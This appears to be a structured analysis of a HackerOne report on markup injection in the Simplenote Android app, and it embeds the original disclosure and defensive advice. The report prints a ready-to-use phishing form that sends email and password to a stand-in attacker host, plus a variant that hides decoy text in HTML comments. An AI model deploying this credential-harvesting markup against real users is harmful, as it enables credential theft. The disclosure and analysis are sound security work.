# Improper Markup Sanitisation in Simplenote Android Application

## Metadata
- **Source:** HackerOne
- **Report:** 297547 | https://hackerone.com/reports/297547
- **Submitted:** 2017-12-13
- **Reporter:** edoverflow
- **Program:** Simplenote Android
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Improper Input Validation, Cross-Site Scripting (XSS), HTML Injection, Markup Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
Simplenote Android v1.5.6 fails to properly sanitise HTML markup in note content, allowing attackers to embed fully-fledged HTML forms that can be rendered in the preview window. An attacker can craft notes containing phishing forms disguised with HTML comments to trick users into submitting credentials to attacker-controlled servers.

## Attack scenario
1. Attacker creates a Simplenote note containing malicious HTML form markup combined with Lorem ipsum text wrapped in HTML comments
2. The HTML comments hide decoy text in the editor view while the form renders invisibly
3. When the victim views the note in preview mode, the comments are stripped and the phishing form becomes visible
4. The form is styled to appear as a legitimate Simplenote login page requesting email and password
5. Victim enters credentials believing they are authenticating with Simplenote
6. Form data is submitted to attacker-controlled server, compromising user credentials

## Root cause
The Simplenote Android application renders HTML content without proper sanitisation or Content Security Policy restrictions. The markup parser does not strip dangerous elements like <form>, <input>, <fieldset> tags, and does not prevent form submission actions. HTML comments are processed by the renderer, allowing attackers to hide content in the editor while revealing it in preview.

## Attacker mindset
An attacker would exploit this to conduct credential harvesting attacks by distributing malicious notes (either directly or through the public note sharing feature if available). The ability to hide the attack payload in HTML comments while showing innocent text in the editor creates plausible deniability and increases the likelihood of successful phishing before detection.

## Defensive takeaways
- Implement strict HTML sanitisation using allowlists that permit only safe formatting tags (b, i, u, p, br, strong, em, h1-h6) and reject form-related tags entirely
- Apply Content Security Policy (CSP) headers to restrict inline styles, form submissions, and JavaScript execution
- Use a dedicated HTML sanitisation library (e.g., OWASP Java HTML Sanitizer) rather than custom parsing
- Strip HTML comments or process them safely to prevent content hiding attacks
- Implement form action blocking at the renderer level to prevent any form submission
- Add security warnings when previewing content with complex HTML structures
- Conduct security review of all HTML rendering paths in the application

## Variant hunting
Search for similar issues in other markdown/note-taking applications that render user-supplied HTML. Test Markdown parsers that support HTML passthrough. Check for similar sanitisation bypasses in web-based note applications. Look for other form-based phishing vectors in rich-text editors.

## MITRE ATT&CK
- T1598.003
- T1566.002
- T1187

## Notes
The report demonstrates a sophisticated attack vector by combining HTML comments with form injection to create a two-view attack surface (editor vs. preview). The proof-of-concept showing form hiding in comments is particularly notable as it increases attack success rate by avoiding detection in the editing interface. This vulnerability is highly exploitable for credential theft and social engineering attacks in a note-sharing platform.

## Full report
<details><summary>Expand</summary>

# Description

The Simplenote Android application (1.5.6) still allows users to embed fully-fledged forms.

```html
Sign in to Simplenote
<h1 class="signin">Please sign in</h1>
<br>
<form action="https://example.com/login.php" id="login" name="login">
   <fieldset class="classic-fieldset" style="border:none;">
      <div class="input-fields">
         <p style="margin-right: 10px;"><label for="email">Email</label><input id="email" name="email" placeholder="Email" required="" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;" type="email"></p>
         <div id="warn"></div>
         <p style="margin-right: 10px;"><label for="password">Password</label><input id="password" name="password" placeholder="Password" required="" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;" type="password"></p>
      </div>
      <br>
      <p><input class="submit button" type="submit" value="Sign In"></p>
      <p><input checked="checked" id="check" name="remember" type="checkbox" value="1"> <label class="option" for="remember">Remember Me</label></p>
      <p class="forgot"><a href="#">Forgot your password?</a></p>
   </fieldset>
</form>
```

{F246484}

A more convincing proof of concept could consist of hiding the form inside several paragraphs of text which are located in HTML comments. That way the victim is presented with what appears to be a text document in the editor panel and then the paragraphs disappear in the preview window.

```html
Sign in to Simplenote

<!-- Lorem ipsum dolor amet polaroid kogi cloud bread keffiyeh vegan DIY pour-over kombucha helvetica wayfarers. Vinyl retro meh cloud bread dreamcatcher af. Dreamcatcher squid twee, tumeric put a bird on it raclette direct trade. Crucifix leggings gluten-free retro la croix. Selvage beard subway tile hella roof party, everyday carry iceland waistcoat kombucha pug. Meh blog cred poke kogi XOXO PBR&B man bun vexillologist woke craft beer chicharrones keffiyeh.

Everyday carry butcher banh mi YOLO whatever shabby chic wayfarers fingerstache hashtag sartorial cloud bread dreamcatcher farm-to-table fashion axe. Post-ironic sartorial farm-to-table venmo next level franzen narwhal crucifix man braid quinoa. Before they sold out jean shorts squid, chicharrones woke scenester normcore church-key. Roof party skateboard lomo neutra disrupt freegan pop-up flannel post-ironic, semiotics art party glossier tilde. Ramps iPhone skateboard, selvage keffiyeh hammock organic fam literally +1 tote bag. Artisan humblebrag scenester retro, umami meggings gochujang cloud bread bespoke. Edison bulb cred pabst iPhone, vice chambray church-key.

Chambray affogato air plant direct trade wolf hot chicken selvage lo-fi franzen next level. Pinterest viral sriracha hell of celiac. Lo-fi knausgaard heirloom aesthetic street art, unicorn prism normcore distillery leggings vice kinfolk neutra twee lyft. Hexagon lo-fi mlkshk, hella wolf health goth viral pinterest.

Asymmetrical shabby chic normcore slow-carb banjo pug hashtag green juice la croix flannel. Four dollar toast 8-bit woke tumblr, YOLO hammock tattooed wolf health goth intelligentsia affogato freegan skateboard mustache. Adaptogen scenester portland health goth austin farm-to-table vexillologist normcore synth twee raw denim microdosing. XOXO paleo swag stumptown adaptogen kinfolk raclette authentic.

Shabby chic enamel pin vape, trust fund poutine brunch af jianbing. 8-bit four dollar toast quinoa fixie, lomo farm-to-table woke waistcoat selvage normcore palo santo vegan. Chambray chicharrones swag, kombucha celiac dreamcatcher venmo. Tousled leggings selvage unicorn. Hoodie whatever glossier, mixtape keytar kickstarter vaporware forage pug chicharrones slow-carb. Bushwick keffiyeh 90's vexillologist readymade yr, try-hard pabst prism messenger bag disrupt street art succulents fanny pack 8-bit. -->

<h1 class="signin">Please sign in</h1>
<br>
<form action="https://example.com/login.php" id="login" name="login">
   <fieldset class="classic-fieldset" style="border:none;">
      <div class="input-fields">
         <p style="margin-right: 10px;"><label for="email">Email</label><input id="email" name="email" placeholder="Email" required="" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;" type="email"></p>
         <div id="warn"></div>
         <p style="margin-right: 10px;"><label for="password">Password</label><input id="password" name="password" placeholder="Password" required="" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;" type="password"></p>
      </div>
      <br>
      <p><input class="submit button" type="submit" value="Sign In"></p>
      <p><input checked="checked" id="check" name="remember" type="checkbox" value="1"> <label class="option" for="remember">Remember Me</label></p>
      <p class="forgot"><a href="#">Forgot your password?</a></p>
   </fieldset>
</form>
```

The form HTML could be replaced with a little bit of JavaScript that dynamically generates the form. This would further increase the likelihood of this attack succeeding.

## Impact

Any user input is sent to an attacker's server when submitted via the form.

</details>

---
*Analysed by Claude on 2026-05-24*
